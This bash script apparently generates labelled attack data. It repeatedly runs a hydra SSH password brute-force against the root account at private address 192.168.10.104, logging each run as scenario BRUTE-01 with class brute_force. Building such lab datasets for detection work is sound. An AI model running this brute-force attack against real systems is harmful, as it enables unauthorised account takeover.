#!/bin/bash
WORDLISTS=(/tmp/wl_small.txt /tmp/wl_medium.txt)
THREADS=(4 8)

for i in 2 3 4 5 6 7 8 9 10 12 13 15; do
    wl=${WORDLISTS[$((RANDOM % 2))]}
    t=${THREADS[$((RANDOM % 2))]}
    echo "=== Retry rep $i/15 -- wordlist=$wl threads=$t ==="
    timeout 60 python3 06_run_logger.py \
        --scenario BRUTE-01 \
        --class brute_force \
        --cmd "timeout 45 hydra -l root -P $wl -t $t ssh://192.168.10.104" \
        --target 192.168.10.104 \
        --note "retry rep $i/15, wordlist=$wl, threads=$t"
    sleep 15
done

echo "RETRY DONE"